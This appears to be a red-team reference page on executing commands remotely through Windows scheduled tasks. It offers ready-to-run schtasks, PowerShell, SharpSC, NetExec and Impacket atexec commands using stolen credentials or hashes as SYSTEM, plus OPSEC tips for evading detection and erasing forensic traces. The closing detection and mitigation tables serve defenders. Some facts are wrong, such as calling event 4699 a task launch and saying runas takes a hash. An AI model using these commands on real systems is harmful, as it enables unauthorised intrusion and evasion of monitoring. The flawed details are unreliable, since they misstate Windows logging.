# Scheduled Tasks

Scheduled Tasks provide task-based automation in Windows. Attackers can create remote scheduled tasks to execute commands on target systems — often evading detection because task creation is common in Windows environments.

## How It Works

1. Authenticate to the target's Task Scheduler service via RPC (port 135) or SMB named pipe (`\PIPE\atsvc` via port 445)
2. Create a scheduled task that runs a command immediately (or at a trigger time)
3. Wait for the task to execute or trigger it manually
4. Retrieve output (if captured to a file)
5. Delete the task to reduce forensic evidence

## Requirements

| Requirement | Detail |
|-------------|--------|
| Privileges | Local admin on target |
| RPC | Port 135 for Task Scheduler (or SMB named pipe) |
| Service | Task Scheduler (`Schedule`) must be running |
| Auth | NTLM or Kerberos |

---

## schtasks.exe — Native Windows Task Scheduler

### Execute Immediate Command

```
# Create task that runs immediately (one-minute trigger)
schtasks /CREATE /S target /SC ONCE /TN "UpdateTask" /TR "cmd /c whoami > C:\out.txt" /ST 00:00 /RU SYSTEM

# Run immediately (start immediately + delete after)
schtasks /RUN /S target /TN "UpdateTask"

# Delete task
schtasks /DELETE /S target /TN "UpdateTask" /F

# With credentials
schtasks /CREATE /S target /U DOMAIN\admin /P Password123! /SC ONCE /TN "Task" /TR "cmd /c whoami" /ST 00:00

# Using NTLM hash (requires runas /netonly first)
runas /netonly /user:DOMAIN\admin "cmd.exe"
schtasks /CREATE /S target /SC ONCE /TN "Backup" /TR "powershell -enc BASE64" /ST 00:00

# As system account
schtasks /CREATE /S target /SC ONCE /TN "SystemTask" /TR "cmd /c whoami" /ST 00:00 /RU SYSTEM

# With delay (lateral movement with time displacement)
schtasks /CREATE /S target /SC ONCE /TN "DelayedTask" /TR "cmd.exe /c powershell -enc BASE64" /ST 00:05

# Execute only (pre-created task)
schtasks /RUN /S target /TN "Microsoft\Windows\Update\UpdateTask"
```

### Using XML-Based Task Creation

```
# Create task from XML file (more flexible)
schtasks /CREATE /S target /XML task.xml /TN "UpdateTask"

# Sample XML content (save as task.xml)
# <?xml version="1.0" encoding="UTF-16"?>
# <Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
#   <RegistrationInfo>
#     <Author>NT AUTHORITY\SYSTEM</Author>
#   </RegistrationInfo>
#   <Principals>
#     <Principal id="Author">
#       <UserId>S-1-5-18</UserId>
#       <RunLevel>HighestAvailable</RunLevel>
#     </Principal>
#   </Principals>
#   <Settings>
#     <Enabled>true</Enabled>
#     <AllowStartOnDemand>true</AllowStartOnDemand>
#   </Settings>
#   <Actions Context="Author">
#     <Exec>
#       <Command>cmd</Command>
#       <Arguments>/c whoami > C:\out.txt</Arguments>
#     </Exec>
#   </Actions>
# </Task>

# Query existing tasks (enumeration)
schtasks /QUERY /S target /V /FO CSV > tasks.csv

# Query specific task folder
schtasks /QUERY /S target /TN "Microsoft\Windows\Update" /V
```

---

## at.exe — Legacy Scheduled Tasks (Pre-Windows 8/2012)

```
# Schedule command (uses AT service, older Windows only)
at \\target 12:00 cmd /c whoami > C:\out.txt

# List scheduled AT jobs
at \\target

# Delete job
at \\target 1 /delete

# With credentials (old AT syntax)
at \\target 12:00 /interactive "cmd /c whoami"
```

**OPSEC**: `at.exe` is deprecated on modern Windows and may not be available.

---

## SharpSC — C# Implementation (execute-assembly friendly)

```
# Create task
SharpSC.exe action=create \\target taskname=CmdTask command="cmd /c whoami > C:\out.txt"

# Start task
SharpSC.exe action=start \\target taskname=CmdTask

# Delete task
SharpSC.exe action=delete \\target taskname=CmdTask

# Query tasks
SharpSC.exe action=query \\target

# Query specific task
SharpSC.exe action=query \\target taskname=CmdTask

# Create and start in one
SharpSC.exe action=createandstart \\target taskname=Task command="whoami"
```

---

## PowerShell — New-ScheduledTask

```powershell
# Create scheduled task remotely via WinRM
Invoke-Command -ComputerName target -ScriptBlock {
    $action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c whoami > C:\out.txt"
    $trigger = New-ScheduledTaskTrigger -At 00:00 -Once
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName "UpdateTask" -Action $action -Trigger $trigger -Principal $principal
    Start-ScheduledTask -TaskName "UpdateTask"
    Unregister-ScheduledTask -TaskName "UpdateTask" -Confirm:$false
}

# Create task from remote session using CIM
$s = New-CimSession -ComputerName target
$action = New-ScheduledTaskAction -Execute "powershell" -Argument "-enc BASE64"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
Register-ScheduledTask -CimSession $s -TaskName "UpdateTask" -Action $action -Trigger $trigger

# Use schtasks from PowerShell
Invoke-Command -ComputerName target -ScriptBlock {
    schtasks /CREATE /SC ONCE /TN "Task" /TR "powershell -enc BASE64" /ST 00:00 /RU SYSTEM /F
    schtasks /RUN /TN "Task"
    schtasks /DELETE /TN "Task" /F
}
```

---

## NetExec — Scheduled Task Execution

```
# Create and run a scheduled task via NetExec
nxc smb target -u admin -H NTLM -X "schtasks /CREATE /SC ONCE /TN Task /TR 'cmd /c whoami > C:\out.txt' /ST 00:00 /RU SYSTEM /F && schtasks /RUN /TN Task && schtasks /DELETE /TN Task /F"
```

NetExec does not have a built-in scheduled task module — use shell command execution.

---

## Impacket — atexec.py

```
# Scheduled task execution via AT (older Windows)
atexec.py DOMAIN/user:'password'@target

# With hash
atexec.py -hashes :NTLM_HASH DOMAIN/user@target

# Execute command
atexec.py DOMAIN/user:pass@target "whoami"

# The tool creates/deletes tasks automatically
```

**Note**: `atexec.py` works on Windows Vista/Server 2008+ but uses the Task Scheduler API — it works on modern Windows, not just legacy AT service.

---

## OPSEC Considerations

| Factor | Risk Level | Notes |
|--------|------------|-------|
| Task creation | Medium | 4698 events (Task registered) are less monitored than 4697 (Service) |
| Task execution | Medium | 4699 events launched when task runs |
| Task deletion | Low | Deletion may not be logged if done by SYSTEM |
| Task name | Medium | Fictional task names (UpdateTask, Backup, etc.) blend in |
| SYSTEM context | Low | Many legitimate tasks run as SYSTEM |
| AT service | Low | Deprecated but uses legacy interfaces |
| XML template | Medium | Custom XML tasks can be crafted to evade basic filtering |
| RPC vs SMB | Medium | RPC (135) vs SMB (445) both logged |

---

## Detection

| Event ID | Source | Indication |
|----------|--------|------------|
| 4698 | Security | Task registered (created) |
| 4699 | Security | Task enabled/scheduled |
| 4700 | Security | Task enabled |
| 4701 | Security | Task disabled |
| 4702 | Security | Task updated |
| 106 | TaskScheduler | Task registered (Operational log) |
| 107 | TaskScheduler | Task triggered/started |
| 108 | TaskScheduler | Task completed |
| 110 | TaskScheduler | Task deleted |
| 140 | TaskScheduler | Task updated |
| 200 | TaskScheduler | Task executed |
| 4624 | Security | LogonType 3 (Network — for remote task creation) |
| 5140 | Security | SMB share access (IPC$ for Task Scheduler pipe) |
| 4688 | Security | Process creation (cmd.exe triggered by taskeng.exe or svchost.exe) |

**Detection logic**:
- Remote task creation (4698) with `TaskContent` containing suspicious commands (cmd, powershell, enc, BASE64)
- Task created and deleted in short succession (4698 then 110)
- Task triggered outside of normal business hours
- Task running from unusual source (via RPC/SMB named pipe from non-admin machine)
- Unknown task names under `\Microsoft\Windows\` subdirectories (malicious tasks blend in here)
- Task that runs `cmd.exe` or `powershell.exe` with hidden window style (0x0)
- Event 106 (Task Registered) with `UserId: S-1-5-18` (SYSTEM) and command-line arguments

## Mitigation

| Control | Detail |
|---------|--------|
| Task Scheduler ACLs | Restrict who can create/modify tasks |
| Audit 4698 | Alert on new task creation from remote sources |
| AppLocker | Block taskeng.exe from launching cmd.exe/powershell.exe |
| WDAC | Windows Defender Application Control policies |
| RPC filtering | Block remote RPC to Task Scheduler |
| SMB hardening | Restrict anonymous access to IPC$ named pipes |
| EDR | Behavioral detection of task-based execution |
| Remove at.exe | Deprecated binary can be removed from modern systems |

## When to Use Scheduled Tasks

- **Service creation is monitored** — Scheduled Tasks generate different event IDs (4698 vs 4697) and may not be watched as closely
- **PsExec/smbexec blocked** — Task Scheduler uses different RPC endpoints than SCM
- **Need SYSTEM execution** — Tasks can run as SYSTEM without service creation
- **Time-shifted execution** — Schedule commands for later to evade real-time detection
- **Persistence** — Scheduled tasks can also be used for long-term persistence

## When NOT to Use Scheduled Tasks

- **Task Scheduler disabled** — or hardened with restricted remote access
- **Target is monitored for 4698 events** — some orgs audit all task creation
- **Interactive command needed** — tasks run in background, not interactive
- **Immediate execution needed** — tasks have a one-minute granularity for ONCE triggers
- **Stealth critical** — task creation/deletion creates multiple forensic artifacts
